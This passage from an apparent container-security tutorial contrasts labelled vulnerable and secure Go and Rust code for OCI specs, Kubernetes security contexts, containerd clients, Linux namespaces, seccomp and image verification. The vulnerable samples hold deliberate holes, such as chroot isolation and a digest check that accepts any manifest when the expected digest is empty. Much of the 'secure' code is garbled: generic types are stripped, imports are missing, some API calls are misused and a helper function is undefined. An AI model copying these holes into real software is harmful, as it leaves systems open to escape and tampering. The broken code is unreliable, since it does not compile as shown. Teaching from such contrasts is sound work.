		oci.WithRootFSReadonly(),

		// Drop ALL capabilities, add only what's needed
		oci.WithCapabilities(nil),           // Drop all
		// oci.WithAddedCapabilities([]string{"CAP_NET_BIND_SERVICE"}), // Add only needed

		// No new privileges
		oci.WithNoNewPrivileges,

		// Minimal mounts
		oci.WithDefaultUnixDevices,

		// Set resource limits
		oci.WithMemoryLimit(256 * 1024 * 1024), // 256MB
		oci.WithCPUs(0.5),                       // 0.5 CPU

		// Network: use existing (managed externally by CNI)
		// Seccomp: apply default Docker profile or custom
		oci.WithSeccompDefault(),
	}

	for _, opt := range opts {
		if err := opt(nil, nil, nil, spec); err != nil {
			return nil, fmt.Errorf("spec option: %w", err)
		}
	}

	// Add /tmp as writable tmpfs (rest of rootfs is read-only)
	spec.Mounts = append(spec.Mounts, specs.Mount{
		Destination: "/tmp",
		Type:        "tmpfs",
		Source:      "tmpfs",
		Options:     []string{"nosuid", "nodev", "noexec", "size=100m", "mode=1777"},
	})

	return spec, nil
}
```

### 13.2 Kubernetes Security Context in Go

```go
// FILE: k8s_secctx_manager.go
//
// Production-grade Kubernetes security context management
// Used by admission webhooks and policy controllers

package security

import (
	"context"
	"fmt"
	"strings"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/intstr"
	"k8s.io/client-go/kubernetes"
	"sigs.k8s.io/controller-runtime/pkg/webhook/admission"
)

// SecurityProfile defines the security requirements for workloads
type SecurityProfile struct {
	// EnforcedStandard is the Pod Security Standard to enforce
	// Values: "privileged", "baseline", "restricted"
	EnforcedStandard string

	// AllowedCapabilities is the set of capabilities that can be added
	// Empty slice = no capabilities allowed
	AllowedCapabilities []corev1.Capability

	// RequiredDropCapabilities must be dropped by all containers
	RequiredDropCapabilities []corev1.Capability

	// AllowPrivilegeEscalation controls allowPrivilegeEscalation
	AllowPrivilegeEscalation *bool

	// SeccompProfile to enforce
	SeccompProfile *corev1.SeccompProfile

	// AllowedVolumes lists permitted volume types
	AllowedVolumes []string

	// ReadOnlyRootFilesystem enforces read-only rootfs
	ReadOnlyRootFilesystem bool

	// RunAsNonRoot enforces non-root user
	RunAsNonRoot bool

	// RunAsUser constraints
	RunAsUser *int64
	RunAsGroup *int64
}

// RestrictedProfile returns the "restricted" Pod Security Standard profile
// This is the most secure baseline for production workloads
func RestrictedProfile() *SecurityProfile {
	falseVal := false
	zero := int64(0)

	return &SecurityProfile{
		EnforcedStandard: "restricted",
		AllowedCapabilities: []corev1.Capability{}, // None
		RequiredDropCapabilities: []corev1.Capability{
			corev1.Capability("ALL"), // Drop ALL capabilities
		},
		AllowPrivilegeEscalation: &falseVal,
		SeccompProfile: &corev1.SeccompProfile{
			Type: corev1.SeccompProfileTypeRuntimeDefault,
		},
		AllowedVolumes: []string{
			"configMap", "emptyDir", "projected",
			"secret", "downwardAPI", "persistentVolumeClaim",
			"ephemeral",
		},
		ReadOnlyRootFilesystem: true,
		RunAsNonRoot:           true,
		RunAsUser:              &zero, // Will be validated: must be > 0
	}
}

// ApplySecurityContext applies the security profile to a pod spec
// This is used by admission webhooks to enforce security policies
func ApplySecurityContext(pod *corev1.Pod, profile *SecurityProfile) error {
	// Apply pod-level security context
	if pod.Spec.SecurityContext == nil {
		pod.Spec.SecurityContext = &corev1.PodSecurityContext{}
	}

	psc := pod.Spec.SecurityContext

	// Run as non-root
	if profile.RunAsNonRoot {
		psc.RunAsNonRoot = boolPtr(true)
	}

	// Apply seccomp profile
	if profile.SeccompProfile != nil {
		psc.SeccompProfile = profile.SeccompProfile
	}

	// Sysctls: only allow safe ones
	// Unsafe sysctls allow containers to modify host kernel parameters
	safeSysctls := []corev1.Sysctl{
		{Name: "net.ipv4.tcp_keepalive_time", Value: "600"},
		// Add only known-safe ones
	}
	// Remove any unsafe sysctls the user specified
	var filteredSysctls []corev1.Sysctl
	for _, sysctl := range psc.Sysctls {
		for _, safe := range safeSysctls {
			if sysctl.Name == safe.Name {
				filteredSysctls = append(filteredSysctls, sysctl)
				break
			}
		}
	}
	psc.Sysctls = filteredSysctls

	// Apply container-level security contexts
	for i := range pod.Spec.Containers {
		if err := applyContainerSecCtx(
			&pod.Spec.Containers[i], profile); err != nil {
			return fmt.Errorf("container %s: %w",
				pod.Spec.Containers[i].Name, err)
		}
	}

	// Apply to init containers too!
	for i := range pod.Spec.InitContainers {
		if err := applyContainerSecCtx(
			&pod.Spec.InitContainers[i], profile); err != nil {
			return fmt.Errorf("initContainer %s: %w",
				pod.Spec.InitContainers[i].Name, err)
		}
	}

	// Apply to ephemeral containers
	for i := range pod.Spec.EphemeralContainers {
		if err := applyEphemeralContainerSecCtx(
			&pod.Spec.EphemeralContainers[i], profile); err != nil {
			return fmt.Errorf("ephemeralContainer %s: %w",
				pod.Spec.EphemeralContainers[i].Name, err)
		}
	}

	// Validate volumes
	if err := validateVolumes(pod.Spec.Volumes, profile.AllowedVolumes); err != nil {
		return fmt.Errorf("volume validation: %w", err)
	}

	// Enforce host namespace restrictions
	if pod.Spec.HostPID {
		return fmt.Errorf("hostPID is not allowed by security policy")
	}
	if pod.Spec.HostIPC {
		return fmt.Errorf("hostIPC is not allowed by security policy")
	}
	if pod.Spec.HostNetwork {
		return fmt.Errorf("hostNetwork is not allowed by security policy")
	}

	return nil
}

func applyContainerSecCtx(c *corev1.Container,
	profile *SecurityProfile) error {
	if c.SecurityContext == nil {
		c.SecurityContext = &corev1.SecurityContext{}
	}

	sc := c.SecurityContext

	// Enforce non-root
	if profile.RunAsNonRoot {
		sc.RunAsNonRoot = boolPtr(true)
		// If RunAsUser is set, ensure it's not 0
		if sc.RunAsUser != nil && *sc.RunAsUser == 0 {
			return fmt.Errorf("container must not run as root (uid 0)")
		}
	}

	// Read-only root filesystem
	if profile.ReadOnlyRootFilesystem {
		sc.ReadOnlyRootFilesystem = boolPtr(true)
	}

	// Privilege escalation
	if profile.AllowPrivilegeEscalation != nil {
		sc.AllowPrivilegeEscalation = profile.AllowPrivilegeEscalation
	}

	// Capabilities
	if sc.Capabilities == nil {
		sc.Capabilities = &corev1.Capabilities{}
	}

	// Drop required capabilities
	droppedAll := false
	for _, cap := range profile.RequiredDropCapabilities {
		if cap == "ALL" {
			droppedAll = true
			break
		}
	}

	if droppedAll {
		// Drop all, then add back only what's in allowed list
		sc.Capabilities.Drop = []corev1.Capability{"ALL"}

		// Validate that any added capabilities are in the allowed list
		var filteredAdd []corev1.Capability
		for _, addCap := range sc.Capabilities.Add {
			allowed := false
			for _, allowedCap := range profile.AllowedCapabilities {
				if addCap == allowedCap {
					allowed = true
					break
				}
			}
			if !allowed {
				return fmt.Errorf("capability %s is not allowed by policy", addCap)
			}
			filteredAdd = append(filteredAdd, addCap)
		}
		sc.Capabilities.Add = filteredAdd
	}

	// Seccomp profile (container-level overrides pod-level)
	if profile.SeccompProfile != nil && sc.SeccompProfile == nil {
		sc.SeccompProfile = profile.SeccompProfile
	}

	// Privileged containers: NEVER in restricted profile
	if sc.Privileged != nil && *sc.Privileged {
		return fmt.Errorf(
			"privileged containers are not allowed by security policy")
	}
	sc.Privileged = boolPtr(false)

	return nil
}

func validateVolumes(volumes []corev1.Volume, allowed []string) error {
	allowedMap := make(map[string]bool)
	for _, v := range allowed {
		allowedMap[v] = true
	}

	for _, vol := range volumes {
		volType := getVolumeType(vol)
		if !allowedMap[volType] {
			return fmt.Errorf("volume type %q is not allowed by policy (volume: %s)",
				volType, vol.Name)
		}

		// Additional checks for host path volumes (always dangerous)
		if vol.HostPath != nil {
			return fmt.Errorf(
				"hostPath volumes are not allowed: volume %s", vol.Name)
		}
	}
	return nil
}

func getVolumeType(vol corev1.Volume) string {
	switch {
	case vol.ConfigMap != nil:
		return "configMap"
	case vol.Secret != nil:
		return "secret"
	case vol.EmptyDir != nil:
		return "emptyDir"
	case vol.PersistentVolumeClaim != nil:
		return "persistentVolumeClaim"
	case vol.Projected != nil:
		return "projected"
	case vol.DownwardAPI != nil:
		return "downwardAPI"
	case vol.HostPath != nil:
		return "hostPath"
	case vol.NFS != nil:
		return "nfs"
	default:
		return "unknown"
	}
}

// SecretRotationManager handles automatic secret rotation
// This prevents long-lived credentials from being stolen from containers
type SecretRotationManager struct {
	client    kubernetes.Interface
	namespace string
	interval  time.Duration
}

func (m *SecretRotationManager) RotateServiceAccountTokens(ctx context.Context) error {
	// List all service accounts
	sas, err := m.client.CoreV1().ServiceAccounts(m.namespace).List(
		ctx, metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("list service accounts: %w", err)
	}

	for _, sa := range sas.Items {
		if err := m.rotateTokenForSA(ctx, sa.Name); err != nil {
			return fmt.Errorf("rotate token for %s: %w", sa.Name, err)
		}
	}
	return nil
}

func (m *SecretRotationManager) rotateTokenForSA(
	ctx context.Context, saName string) error {
	// List secrets for this SA
	secrets, err := m.client.CoreV1().Secrets(m.namespace).List(
		ctx, metav1.ListOptions{
			LabelSelector: fmt.Sprintf(
				"kubernetes.io/service-account.name=%s", saName),
		})
	if err != nil {
		return err
	}

	for _, secret := range secrets.Items {
		if secret.Type != corev1.SecretTypeServiceAccountToken {
			continue
		}

		// Delete old token secret - Kubernetes will create a new one
		if err := m.client.CoreV1().Secrets(m.namespace).Delete(
			ctx, secret.Name, metav1.DeleteOptions{}); err != nil {
			if !errors.IsNotFound(err) {
				return err
			}
		}
	}
	return nil
}

func boolPtr(b bool) *bool { return &b }
func int64Ptr(i int64) *int64 { return &i }
```

### 13.3 Container Runtime Secure gRPC Client (Go)

```go
// FILE: runtime_client_secure.go
//
// Secure containerd gRPC client with authentication and TLS
// Used by container orchestrators to communicate with containerd

package runtime

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"net"
	"os"
	"time"

	containerd "github.com/containerd/containerd"
	"github.com/containerd/containerd/namespaces"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/keepalive"
)

const (
	// containerd unix socket path
	containerdSocket = "/run/containerd/containerd.sock"
	// Dial timeout - prevents hanging indefinitely
	dialTimeout = 10 * time.Second
	// gRPC call timeout
	callTimeout = 30 * time.Second
)

// RuntimeClient wraps containerd client with security controls
type RuntimeClient struct {
	client    *containerd.Client
	namespace string
}

// VULNERABLE: Insecure client creation
func vulnerableCreateClient() (*containerd.Client, error) {
	// BUG 1: No timeout on dial
	// BUG 2: No TLS (uses Unix socket - OK locally, but not remotely)
	// BUG 3: No namespace isolation
	// BUG 4: Default gRPC options (no max message size, no keepalive)
	return containerd.New(containerdSocket)
}

// SECURE: Creating containerd client with full security controls
func NewSecureRuntimeClient(socketPath, namespace string) (*RuntimeClient, error) {
	ctx, cancel := context.WithTimeout(context.Background(), dialTimeout)
	defer cancel()

	// Validate socket path to prevent path traversal
	if err := validateSocketPath(socketPath); err != nil {
		return nil, fmt.Errorf("invalid socket path: %w", err)
	}

	// Check socket permissions before connecting
	if err := checkSocketPermissions(socketPath); err != nil {
		return nil, fmt.Errorf("socket permission check: %w", err)
	}

	// Build dial options with security settings
	dialOpts := []grpc.DialOption{
		// Unix socket transport
		grpc.WithContextDialer(func(ctx context.Context, addr string) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, "unix", addr)
		}),

		// Insecure for Unix socket (but verify with creds for TCP)
		grpc.WithInsecure(), // Unix socket: no TLS needed (OS handles auth)

		// Keepalive: detect dead connections quickly
		grpc.WithKeepaliveParams(keepalive.ClientParameters{
			Time:                10 * time.Second, // Ping interval
			Timeout:             3 * time.Second,  // Ping timeout
			PermitWithoutStream: true,
		}),

		// Limit message sizes to prevent memory exhaustion
		grpc.WithDefaultCallOptions(
			grpc.MaxCallRecvMsgSize(32 * 1024 * 1024),  // 32MB max receive
			grpc.WithMaxRecvMsgSize(32 * 1024 * 1024),
		),

		// Block until connected (with timeout from ctx)
		grpc.WithBlock(),
	}

	client, err := containerd.New(socketPath,
		containerd.WithDefaultNamespace(namespace),
		containerd.WithTimeout(dialTimeout),
		containerd.WithDialOpts(dialOpts),
	)
	if err != nil {
		return nil, fmt.Errorf("create containerd client: %w", err)
	}

	// Verify connectivity with health check
	if err := verifyConnection(ctx, client); err != nil {
		client.Close()
		return nil, fmt.Errorf("health check failed: %w", err)
	}

	return &RuntimeClient{
		client:    client,
		namespace: namespace,
	}, nil
}

// NewSecureTCPRuntimeClient creates a client for remote containerd
// Used in multi-node setups where containerd is accessed over TCP
func NewSecureTCPRuntimeClient(addr, namespace, certFile, keyFile, caFile string) (*RuntimeClient, error) {
	// Load client certificate
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return nil, fmt.Errorf("load client cert: %w", err)
	}

	// Load CA certificate for server verification
	caPEM, err := os.ReadFile(caFile)
	if err != nil {
		return nil, fmt.Errorf("read CA: %w", err)
	}

	certPool := x509.NewCertPool()
	if !certPool.AppendCertsFromPEM(caPEM) {
		return nil, fmt.Errorf("parse CA certificate")
	}

	tlsCfg := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            certPool,
		MinVersion:         tls.VersionTLS13, // Require TLS 1.3 for remote
		InsecureSkipVerify: false,            // MUST verify server cert
		// Server name should match the CN/SAN in server's certificate
		ServerName: extractHostname(addr),
	}

	creds := credentials.NewTLS(tlsCfg)

	dialOpts := []grpc.DialOption{
		grpc.WithTransportCredentials(creds),
		grpc.WithBlock(),
		grpc.WithKeepaliveParams(keepalive.ClientParameters{
			Time:    10 * time.Second,
			Timeout: 3 * time.Second,
		}),
	}

	ctx, cancel := context.WithTimeout(context.Background(), dialTimeout)
	defer cancel()

	client, err := containerd.New(addr,
		containerd.WithDefaultNamespace(namespace),
		containerd.WithTimeout(dialTimeout),
		containerd.WithDialOpts(dialOpts),
	)
	if err != nil {
		return nil, fmt.Errorf("create remote containerd client: %w", err)
	}

	if err := verifyConnection(ctx, client); err != nil {
		client.Close()
		return nil, fmt.Errorf("health check failed: %w", err)
	}

	return &RuntimeClient{client: client, namespace: namespace}, nil
}

func validateSocketPath(path string) error {
	// Prevent path traversal
	if strings.Contains(path, "..") {
		return fmt.Errorf("path contains '..'")
	}

	// Must be absolute path
	if !filepath.IsAbs(path) {
		return fmt.Errorf("path must be absolute")
	}

	// Check it actually exists and is a socket
	fi, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("stat socket: %w", err)
	}

	if fi.Mode()&os.ModeSocket == 0 {
		return fmt.Errorf("not a socket: %s", path)
	}

	return nil
}

func checkSocketPermissions(path string) error {
	fi, err := os.Stat(path)
	if err != nil {
		return err
	}

	// Socket should NOT be world-writable
	if fi.Mode().Perm()&0002 != 0 {
		return fmt.Errorf("socket %s is world-writable - security risk!", path)
	}

	// Socket should NOT be world-readable (for containerd)
	if fi.Mode().Perm()&0004 != 0 {
		return fmt.Errorf("socket %s is world-readable - security risk!", path)
	}

	return nil
}

func verifyConnection(ctx context.Context, client *containerd.Client) error {
	// Ping containerd to verify connection
	if _, err := client.Version(ctx); err != nil {
		return fmt.Errorf("version check failed: %w", err)
	}
	return nil
}
```

---

## 14. Vulnerable vs Secure Code: Rust Implementations

### 14.1 Container Namespace Management in Rust

```rust
// FILE: namespace_manager.rs
//
// Secure Linux namespace management in Rust
// Used in container runtimes and sandbox implementations
//
// Dependencies in Cargo.toml:
// nix = { version = "0.27", features = ["process", "mount", "user", "sched"] }
// libc = "0.2"
// anyhow = "1.0"
// caps = "0.5"

use std::collections::HashMap;
use std::fs;
use std::io::{self, Write};
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use caps::{CapSet, Capability};
use nix::mount::{mount, MntFlags, MsFlags};
use nix::sched::{clone, unshare, CloneFlags};
use nix::sys::prctl;
use nix::sys::signal::Signal;
use nix::unistd::{chdir, getgid, getuid, pivot_root, sethostname, setresgid, setresuid};

/// VULNERABLE: Simple namespace setup without proper security
#[allow(dead_code)]
mod vulnerable {
    use nix::sched::{clone, CloneFlags};
    use nix::unistd::chroot;
    use std::path::Path;

    pub fn create_container_simple(rootfs: &Path) -> nix::Result {
        let stack = vec![0u8; 1024 * 1024];
        let stack_ptr = Box::new(stack);

        // BUG 1: Missing CLONE_NEWUSER (no user namespace isolation)
        // BUG 2: Missing CLONE_NEWCGROUP (cgroup namespace)
        // BUG 3: Using chroot instead of pivot_root (escapable)
        let flags = CloneFlags::CLONE_NEWPID
            | CloneFlags::CLONE_NEWNS
            | CloneFlags::CLONE_NEWNET;

        let root = rootfs.to_owned();
        clone(
            Box::new(move || {
                // BUG: chroot is insufficient - can be escaped
                chroot(&root).expect("chroot failed");
                std::process::exit(0);
            }),
            &mut *Box::leak(stack_ptr),
            flags,
            Some(nix::sys::signal::Signal::SIGCHLD),
        )
    }
}

/// Configuration for container namespace setup
#[derive(Debug, Clone)]
pub struct NamespaceConfig {
    pub rootfs: PathBuf,
    pub hostname: String,
    pub uid: u32,
    pub gid: u32,
    pub uid_map: Vec,
    pub gid_map: Vec,
    pub read_only_rootfs: bool,
    pub masked_paths: Vec,
    pub readonly_paths: Vec,
}

#[derive(Debug, Clone)]
pub struct IdMap {
    pub container_id: u32,
    pub host_id: u32,
    pub size: u32,
}

impl Default for NamespaceConfig {
    fn default() -> Self {
        let host_uid = unsafe { libc::getuid() };
        let host_gid = unsafe { libc::getgid() };

        Self {
            rootfs: PathBuf::from("/var/lib/containers/rootfs"),
            hostname: "container".to_string(),
            uid: 1000,
            gid: 1000,
            uid_map: vec![IdMap {
                container_id: 0,
                host_id: host_uid,
                size: 65536,
            }],
            gid_map: vec![IdMap {
                container_id: 0,
                host_id: host_gid,
                size: 65536,
            }],
            read_only_rootfs: true,
            masked_paths: vec![
                PathBuf::from("/proc/kcore"),
                PathBuf::from("/proc/kallsyms"),
                PathBuf::from("/proc/kmsg"),
                PathBuf::from("/proc/sysrq-trigger"),
                PathBuf::from("/sys/firmware"),
            ],
            readonly_paths: vec![
                PathBuf::from("/proc/sys"),
                PathBuf::from("/proc/bus"),
                PathBuf::from("/proc/fs"),
                PathBuf::from("/proc/irq"),
            ],
        }
    }
}

/// SECURE: Full container namespace setup with all security controls
pub struct ContainerInit {
    config: NamespaceConfig,
}

impl ContainerInit {
    pub fn new(config: NamespaceConfig) -> Self {
        Self { config }
    }

    /// Setup the container rootfs using pivot_root (not chroot)
    pub fn setup_rootfs(&self) -> Result {
        let rootfs = &self.config.rootfs;

        // Validate rootfs exists and is a directory (no symlink follow)
        let metadata = fs::symlink_metadata(rootfs)
            .with_context(|| format!("stat rootfs {:?}", rootfs))?;

        if !metadata.is_dir() {
            bail!("rootfs {:?} is not a directory", rootfs);
        }

        // Bind mount rootfs onto itself to make it a mount point
        // Required for pivot_root to work
        mount(
            Some(rootfs.as_path()),
            rootfs.as_path(),
            None::,
            MsFlags::MS_BIND | MsFlags::MS_REC | MsFlags::MS_PRIVATE,
            None::,
        )
        .with_context(|| format!("bind mount rootfs {:?}", rootfs))?;

        // Change to new root
        chdir(rootfs).context("chdir to rootfs")?;

        // Create directory for old root
        let put_old = rootfs.join(".pivot_root_old");
        fs::create_dir_all(&put_old)
            .with_context(|| format!("mkdir {:?}", put_old))?;

        // Set permissions on put_old (only root should access during pivot)
        fs::set_permissions(&put_old, fs::Permissions::from_mode(0o700))?;

        // pivot_root: atomically makes new_root the root
        pivot_root(rootfs, &put_old).context("pivot_root")?;

        // Now at new root
        chdir("/").context("chdir /")?;

        // Unmount old root with MNT_DETACH
        // This removes it from the mount tree immediately even if busy
        nix::mount::umount2("/.pivot_root_old", MntFlags::MNT_DETACH)
            .context("umount old root")?;

        // Remove the now-unmounted directory
        fs::remove_dir("/.pivot_root_old")
            .unwrap_or_else(|e| eprintln!("rmdir pivot_root_old (non-fatal): {}", e));

        // Make rootfs read-only if configured
        if self.config.read_only_rootfs {
            mount(
                None::,
                "/",
                None::,
                MsFlags::MS_REMOUNT | MsFlags::MS_RDONLY | MsFlags::MS_BIND,
                None::,
            )
            .context("remount rootfs read-only")?;
        }

        Ok(())
    }

    /// Mount proc with security options
    pub fn mount_proc(&self) -> Result {
        mount(
            Some("proc"),
            "/proc",
            Some("proc"),
            MsFlags::MS_NOSUID | MsFlags::MS_NOEXEC | MsFlags::MS_NODEV,
            None::,
        )
        .context("mount /proc")?;

        // Apply masked paths
        for path in &self.config.masked_paths {
            let path_str = path.to_string_lossy();
            // Bind mount /dev/null over masked paths
            if let Err(e) = mount(
                Some("/dev/null"),
                path.as_path(),
                None::,
                MsFlags::MS_BIND,
                None::,
            ) {
                eprintln!("Warning: could not mask {}: {}", path_str, e);
            }
        }

        // Make readonly paths read-only
        for path in &self.config.readonly_paths {
            let _ = mount(
                None::,
                path.as_path(),
                None::,
                MsFlags::MS_REMOUNT | MsFlags::MS_RDONLY | MsFlags::MS_NOSUID
                    | MsFlags::MS_NOEXEC | MsFlags::MS_NODEV,
                None::,
            );
        }

        Ok(())
    }

    /// Drop all capabilities
    pub fn drop_all_capabilities(&self) -> Result {
        // Drop bounding set
        for cap in caps::all() {
            caps::drop(None, CapSet::Bounding, cap)
                .unwrap_or_else(|_| {}); // Ignore EINVAL for unknown caps
        }

        // Clear all capability sets
        caps::clear(None, CapSet::Effective)?;
        caps::clear(None, CapSet::Permitted)?;
        caps::clear(None, CapSet::Inheritable)?;
        caps::clear(None, CapSet::Ambient)?;

        // Verify
        for cap_set in &[
            CapSet::Effective,
            CapSet::Permitted,
            CapSet::Inheritable,
        ] {
            let set = caps::read(None, *cap_set)?;
            if !set.is_empty() {
                bail!(
                    "SECURITY ERROR: capability set {:?} not empty after drop: {:?}",
                    cap_set, set
                );
            }
        }

        Ok(())
    }

    /// Set NO_NEW_PRIVS
    pub fn set_no_new_privs(&self) -> Result {
        prctl::set_no_new_privs().context("prctl SET_NO_NEW_PRIVS")?;

        // Verify it was set
        if !prctl::get_no_new_privs()? {
            bail!("SECURITY ERROR: NO_NEW_PRIVS not set after prctl");
        }

        Ok(())
    }

    /// Apply seccomp filter
    pub fn apply_seccomp(&self) -> Result {
        // Use libseccomp-rs or direct BPF
        // This is a simplified example using the syscall directly
        apply_seccomp_allowlist(&WEBSERVER_SYSCALLS)
    }

    /// Run the full container initialization sequence
    pub fn run(&self) -> Result {
        // 1. Setup rootfs
        self.setup_rootfs().context("setup rootfs")?;

        // 2. Mount filesystems
        self.mount_proc().context("mount proc")?;
        self.mount_dev().context("mount dev")?;
        self.mount_sys().context("mount sys")?;
        self.mount_tmp().context("mount tmp")?;

        // 3. Set hostname in UTS namespace
        sethostname(&self.config.hostname).context("sethostname")?;

        // 4. Set UID/GID (must be before capability drop)
        let gid = nix::unistd::Gid::from_raw(self.config.gid);
        let uid = nix::unistd::Uid::from_raw(self.config.uid);

        setresgid(gid, gid, gid).context("setresgid")?;
        setresuid(uid, uid, uid).context("setresuid")?;

        // 5. Drop capabilities
        self.drop_all_capabilities().context("drop capabilities")?;

        // 6. Set NO_NEW_PRIVS (must be before seccomp)
        self.set_no_new_privs().context("set no_new_privs")?;

        // 7. Apply seccomp filter (MUST be last - may block prctl itself)
        self.apply_seccomp().context("apply seccomp")?;

        Ok(())
    }

    fn mount_dev(&self) -> Result {
        mount(
            Some("tmpfs"),
            "/dev",
            Some("tmpfs"),
            MsFlags::MS_NOSUID | MsFlags::MS_STRICTATIME,
            Some("mode=755,size=65536k"),
        )?;

        // Create device files
        let devices = [
            ("/dev/null",    libc::S_IFCHR | 0o666u32, libc::makedev(1, 3)),
            ("/dev/zero",    libc::S_IFCHR | 0o666u32, libc::makedev(1, 5)),
            ("/dev/full",    libc::S_IFCHR | 0o666u32, libc::makedev(1, 7)),
            ("/dev/random",  libc::S_IFCHR | 0o444u32, libc::makedev(1, 8)),
            ("/dev/urandom", libc::S_IFCHR | 0o444u32, libc::makedev(1, 9)),
            ("/dev/tty",     libc::S_IFCHR | 0o666u32, libc::makedev(5, 0)),
        ];

        for (path, mode, dev) in &devices {
            unsafe {
                let c_path = std::ffi::CString::new(*path).unwrap();
                libc::mknod(c_path.as_ptr(), *mode, *dev as libc::dev_t);
            }
        }

        Ok(())
    }

    fn mount_sys(&self) -> Result {
        mount(
            Some("sysfs"),
            "/sys",
            Some("sysfs"),
            MsFlags::MS_NOSUID | MsFlags::MS_NOEXEC | MsFlags::MS_NODEV | MsFlags::MS_RDONLY,
            None::,
        )?;
        Ok(())
    }

    fn mount_tmp(&self) -> Result {
        mount(
            Some("tmpfs"),
            "/tmp",
            Some("tmpfs"),
            MsFlags::MS_NOSUID | MsFlags::MS_NODEV | MsFlags::MS_NOEXEC,
            Some("size=100m,mode=1777"),
        )?;
        Ok(())
    }
}

// Seccomp filter using raw BPF (production would use libseccomp-rs)
fn apply_seccomp_allowlist(allowed: &[libc::c_long]) -> Result {
    use std::mem;

    // Set NO_NEW_PRIVS first
    unsafe {
        if libc::prctl(libc::PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0 {
            return Err(io::Error::last_os_error().into());
        }
    }

    // Build BPF filter
    // In production: use seccompiler crate or libseccomp-rs
    // This is a simplified demonstration

    // For now, just verify the capability
    let bpf_prog = build_seccomp_bpf(allowed)?;

    unsafe {
        let prog = libc::sock_fprog {
            len: bpf_prog.len() as u16,
            filter: bpf_prog.as_ptr() as *mut libc::sock_filter,
        };

        let ret = libc::prctl(
            libc::PR_SET_SECCOMP,
            libc::SECCOMP_MODE_FILTER,
            &prog as *const _,
        );
        if ret < 0 {
            return Err(io::Error::last_os_error()
                .into()).context("prctl PR_SET_SECCOMP");
        }
    }

    Ok(())
}

/// Write UID/GID maps from parent process
/// This must be called FROM THE PARENT after clone()
pub fn write_id_maps(
    pid: nix::unistd::Pid,
    uid_map: &[IdMap],
    gid_map: &[IdMap],
) -> Result {
    // Must write "deny" to setgroups BEFORE writing gid_map
    // This prevents privilege escalation via group manipulation
    let setgroups_path = format!("/proc/{}/setgroups", pid);
    fs::write(&setgroups_path, b"deny")
        .with_context(|| format!("write {}", setgroups_path))?;

    // Write UID map
    let uid_map_path = format!("/proc/{}/uid_map", pid);
    let uid_map_content: String = uid_map
        .iter()
        .map(|m| format!("{} {} {}\n", m.container_id, m.host_id, m.size))
        .collect();
    fs::write(&uid_map_path, uid_map_content.as_bytes())
        .with_context(|| format!("write {}", uid_map_path))?;

    // Write GID map
    let gid_map_path = format!("/proc/{}/gid_map", pid);
    let gid_map_content: String = gid_map
        .iter()
        .map(|m| format!("{} {} {}\n", m.container_id, m.host_id, m.size))
        .collect();
    fs::write(&gid_map_path, gid_map_content.as_bytes())
        .with_context(|| format!("write {}", gid_map_path))?;

    Ok(())
}

const WEBSERVER_SYSCALLS: [libc::c_long; 40] = [
    libc::SYS_read,
    libc::SYS_write,
    libc::SYS_close,
    libc::SYS_fstat,
    libc::SYS_mmap,
    libc::SYS_mprotect,
    libc::SYS_munmap,
    libc::SYS_brk,
    libc::SYS_rt_sigaction,
    libc::SYS_rt_sigprocmask,
    libc::SYS_rt_sigreturn,
    libc::SYS_ioctl,
    libc::SYS_pread64,
    libc::SYS_pwrite64,
    libc::SYS_access,
    libc::SYS_pipe,
    libc::SYS_select,
    libc::SYS_sched_yield,
    libc::SYS_mremap,
    libc::SYS_msync,
    libc::SYS_socket,
    libc::SYS_connect,
    libc::SYS_accept,
    libc::SYS_accept4,
    libc::SYS_sendto,
    libc::SYS_recvfrom,
    libc::SYS_sendmsg,
    libc::SYS_recvmsg,
    libc::SYS_bind,
    libc::SYS_listen,
    libc::SYS_getsockname,
    libc::SYS_getpeername,
    libc::SYS_setsockopt,
    libc::SYS_getsockopt,
    libc::SYS_clone,
    libc::SYS_fork,
    libc::SYS_vfork,
    libc::SYS_execve,
    libc::SYS_exit,
    libc::SYS_exit_group,
];
```

### 14.2 Secure Container Manifest Verification (Rust)

```rust
// FILE: image_verify.rs
//
// Container image signature and integrity verification in Rust
// Production-grade supply chain security implementation

use std::path::Path;
use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

/// OCI image manifest (simplified)
#[derive(Debug, Deserialize, Serialize)]
pub struct ImageManifest {
    pub schema_version: u32,
    pub media_type: String,
    pub config: ImageDescriptor,
    pub layers: Vec,
}

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct ImageDescriptor {
    pub media_type: String,
    pub size: u64,
    pub digest: String,
}

/// VULNERABLE: Image verification without digest checking
#[allow(dead_code)]
mod vulnerable_verify {
    use super::*;

    pub async fn pull_and_run(image_ref: &str) -> Result {
        // BUG 1: Pulling by tag only (mutable)
        // BUG 2: No signature verification
        // BUG 3: No digest verification of layers
        // BUG 4: No vulnerability scanning before run
        println!("Pulling {}", image_ref);
        // ... pull code ...
        Ok(())
    }

    pub fn verify_manifest_naive(manifest_bytes: &[u8],
                                  expected_digest: &str) -> bool {
        // BUG: Using string comparison on unsanitized input
        // If expected_digest is empty, this returns true for ANYTHING!
        if expected_digest.is_empty() {
            return true;  // CRITICAL BUG: no digest = passes any manifest
        }
        // BUG: Not using constant-time comparison (timing oracle)
        let computed = format!("{:x}", sha2::Sha256::digest(manifest_bytes));
        computed == expected_digest.trim_start_matches("sha256:")
    }
}

/// SECURE: Complete image verification with cryptographic integrity checks
pub struct ImageVerifier {
    trusted_keys: Vec,
    policy: VerificationPolicy,
}

#[derive(Debug, Clone)]
pub struct VerificationPolicy {
    pub require_signature: bool,
    pub require_sbom: bool,
    pub require_provenance: bool,
    pub max_age_days: Option,
    pub allowed_registries: Vec,
    pub denied_base_images: Vec,
}

impl Default for VerificationPolicy {
    fn default() -> Self {
        Self {
            require_signature: true,
            require_sbom: false,
            require_provenance: false,
            max_age_days: Some(90),
            allowed_registries: vec![
